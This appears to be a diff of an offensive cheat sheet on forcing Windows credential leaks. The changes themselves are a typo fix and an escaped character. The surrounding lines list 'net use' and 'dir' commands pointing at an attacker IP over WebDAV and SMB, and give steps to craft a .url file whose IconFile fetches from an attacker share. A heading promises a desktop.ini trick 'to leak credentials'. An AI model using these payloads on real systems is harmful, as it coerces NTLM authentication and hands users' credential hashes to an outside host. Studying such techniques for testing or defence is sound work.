@@ -25,7 +25,7 @@ dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
 * net use * https://1.2.3.4:443/folder/subfolder password /user:userID
 * net use * http://1.2.3.4/folder/subfolder password /user:root
 * net use * \\\\1.2.3.4\\folder\\subfolder password /user:userID
-* net use \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe . (the DavWWWRoot triggers WebDAV forcibly )
+* net use \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe \. (the DavWWWRoot triggers WebDAV forcibly )
 * net use \\\\domain.site@80\\uri_folder\\index.html
 * net use * https://1.2.3.4:443/folder/subfolder password /user:userID
 * dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe
@@ -36,7 +36,7 @@ Create a new TXT file and paste the following:<br/>
 URL=http://www.WeLoveResponder.com <br/>
 IconIndex=0  <br/>
 IconFile\=\\\\1.2.3.4\\L3\\3T.ico
-Renate the file from .txt to .url
+Rename the file from .txt to .url
 
 ## Create desktop.ini file to leak credentials using a folder
 mkdir Folder <br/>
